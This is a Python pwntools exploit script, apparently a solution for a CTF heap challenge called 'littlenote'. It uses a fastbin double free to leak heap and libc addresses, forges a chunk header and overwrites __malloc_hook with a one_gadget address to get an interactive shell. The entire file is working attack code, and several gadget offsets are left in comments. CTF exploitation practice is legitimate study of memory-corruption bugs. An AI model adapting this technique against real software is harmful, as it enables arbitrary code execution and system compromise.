#!/usr/bin/env python
from pwn import *
p=process('./littlenote',env={'LD_PRELOAD':'./libc.so.6'})
context.log_level='debug'

ru=lambda s:p.recvuntil(s)
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)

def menu(i):
    ru('Your choice:\n')
    sl(str(i))

def add(note,sline=1,yes_or_not=1):
    menu(1)
    ru('Enter your note\n')
    if sline:
        sl(note)
    else:
        sd(note)
    ru('note?\n')
    if yes_or_not:
        sl(str('Y'))
    else:
        sl('N')

def show(i):
    menu(2)
    ru('Which note do you want to show?\n')
    sl(str(i))

def delete(i):
    menu(3)
    ru('Which note do you want to delete?\n')
    sl(str(i))

def debugf(load=''):
    gdb.attach(p)

add('a')                                       # 0
add('a'*0x40+p64(0)+p64(0x71)+p64(0)*2,sline=0)       # 1
add('a')                                       # 2
add('a')                                       # 3
add('a')                                       # 4

delete(0)
delete(1)
delete(0)

show(0)
heap_base=u64(ru('\n').strip('\n').ljust(8,'\x00'))-0x70
print(hex(heap_base))
heap_target=heap_base+0xc0

add(p64(heap_target))               # 5
add('a')                            # 6
add('a')                            # 7
add(p64(0)*3+p64(0x70+0x71))        # 8
# delete(7) 

delete(2)
            
add('')                       # 9
show(9)
a=ru('\n')
libc_base=u64(('\x00'+ru('\n').strip('\n')).ljust(8,'\x00'))-0x3c4c00
print(hex(libc_base))


delete(0)
delete(1)
delete(0)

elf=ELF('./libc.so.6')
elf.address=libc_base
malloc_hook_target=elf.symbols['__malloc_hook']-0x23
 
# pause()
add(p64(malloc_hook_target))              # 10
add('a')                                  # 11
add('12')
one_off=0x45216
# one_off=0x4526a
# one_off=0xf0274
# one_off=0xf1117
one=libc_base+one_off
add('\x00'*0x13+p64(one))
# debugf('nb a88\n') 
gdb.attach(p,'nb a88')
# pause()
show(1)
menu(1)

p.interactive()